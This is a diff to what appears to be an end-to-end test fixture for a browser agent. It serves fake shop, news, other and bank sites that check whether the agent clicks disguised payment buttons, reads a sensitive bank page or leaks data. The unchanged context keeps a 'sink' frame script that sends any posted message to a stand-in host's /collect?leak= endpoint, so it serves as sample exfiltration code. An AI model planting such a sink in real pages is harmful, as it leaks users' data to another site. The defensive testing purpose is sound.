@@ -133,6 +133,25 @@ setInterval(() => {
 /** other.test's frame that a page of the run's sites posts a message to: it sends what it's given home, by a fetch of its own. */
 const SINK = page("Sink", `<p>sink</p><script>addEventListener("message", (e) => { fetch("/collect?leak=" + encodeURIComponent(String(e.data)) + "&via=postmessage-frame").catch(() => {}); });</script>`);
 
+/**
+ * Pages whose one button places an order or pays, by the page's semantics alone (its words say only "Continue"): a submit in a
+ * schema.org Order, a payment provider's button, the submit of a form with a card field, and a page with a provider's payment
+ * frame. A click that lands writes "ordered" in #out.
+ */
+const DID = `onclick="document.getElementById('out').textContent = 'ordered'; return false"`;
+const ORDERS = {
+  schema: page("Your order", `<h1>Your order</h1><div itemscope itemtype="https://schema.org/Order"><form onsubmit="return false"><button type="submit" ${DID}>Continue</button></form></div><p id="out">not yet</p>`),
+  provider: page("Your order", `<h1>Your order</h1><button type="button" class="paypal-button" ${DID}>Continue</button><p id="out">not yet</p>`),
+  card: page("Your order", `<h1>Your order</h1><form onsubmit="return false"><label for="cc">Number</label><input id="cc" autocomplete="cc-number"><button type="submit" ${DID}>Continue</button></form><p id="out">not yet</p>`),
+  frame: page("Your order", `<h1>Your order</h1><iframe src="https://js.stripe.com/v3/elements" width="10" height="10"></iframe><button type="button" ${DID}>Continue</button><p id="out">not yet</p>`),
+};
+
+/** What only the bank's page holds: a read or a result that carries it has read a sensitive site. */
+export const BANK_WORDS = "Balance on the joint account";
+const BANK = page("Your bank", `<h1>Your bank</h1><p>${BANK_WORDS}: 4 210,00.</p>`);
+/** A page of the run's sites with a link to a sensitive site of the grant (`bank.test`: its "bank" label makes it one). */
+const TO_BANK = (port) => page("Links to the bank", `<h1>Pay your rent</h1><a id="bank" href="https://bank.test:${port}/?from=link">Go to your bank</a>`);
+
 const FRAMES = (port) => page("Frames", `<h1>Frames</h1>
 <p>The page around the frames.</p>
 <iframe id="same" src="/inner" width="400" height="160"></iframe>
@@ -146,7 +165,7 @@ export class FixtureSites {
     this.dir = mkdtempSync(join(tmpdir(), "tafs-e2e-tls-"));
     const key = join(this.dir, "key.pem");
     const cert = join(this.dir, "cert.pem");
-    execFileSync("openssl", ["req", "-x509", "-newkey", "ec", "-pkeyopt", "ec_paramgen_curve:prime256v1", "-nodes", "-keyout", key, "-out", cert, "-days", "1", "-subj", "/CN=shop.test", "-addext", "subjectAltName=DNS:shop.test,DNS:news.test,DNS:other.test"], { stdio: "ignore" });
+    execFileSync("openssl", ["req", "-x509", "-newkey", "ec", "-pkeyopt", "ec_paramgen_curve:prime256v1", "-nodes", "-keyout", key, "-out", cert, "-days", "1", "-subj", "/CN=shop.test", "-addext", "subjectAltName=DNS:shop.test,DNS:news.test,DNS:other.test,DNS:bank.test"], { stdio: "ignore" });
     this.hits = []; // every request, as "host path?query"
     this.posts = []; // every POST, as "host path?query"
     this.hosts = new Map(); // a host answered by a test's own handler (serve)
@@ -185,10 +204,13 @@ export class FixtureSites {
     const pages = {
       "news.test": { "/article": ARTICLE, "/long": LONG, "/inner": INNER(CROSS_FRAME_PASSWORD), "/hub": HUB(this.port) },
       "shop.test": {
+        "/to-bank": TO_BANK(this.port),
+        ...Object.fromEntries(Object.entries(ORDERS).map(([name, body]) => ["/order-" + name, body])),
         "/form": FORM, "/confirm": CONFIRM, "/account": ACCOUNT, "/links": LINKS(this.port), "/frames": FRAMES(this.port), "/inner": INNER(FRAME_PASSWORD),
         ...Object.fromEntries(Object.entries(LEAVE).map(([name, make]) => ["/leave-" + name, make(this.port)])),
         ...Object.fromEntries(LEAK_VIAS.map((via) => ["/leak-" + via, LEAK(this.port, via)])),
       },
+      "bank.test": { "/": BANK },
       "other.test": { "/": OTHER, "/collect": OTHER, "/account": ACCOUNT, "/sink": SINK },
     };
     const body = (pages[host] || {})[path];
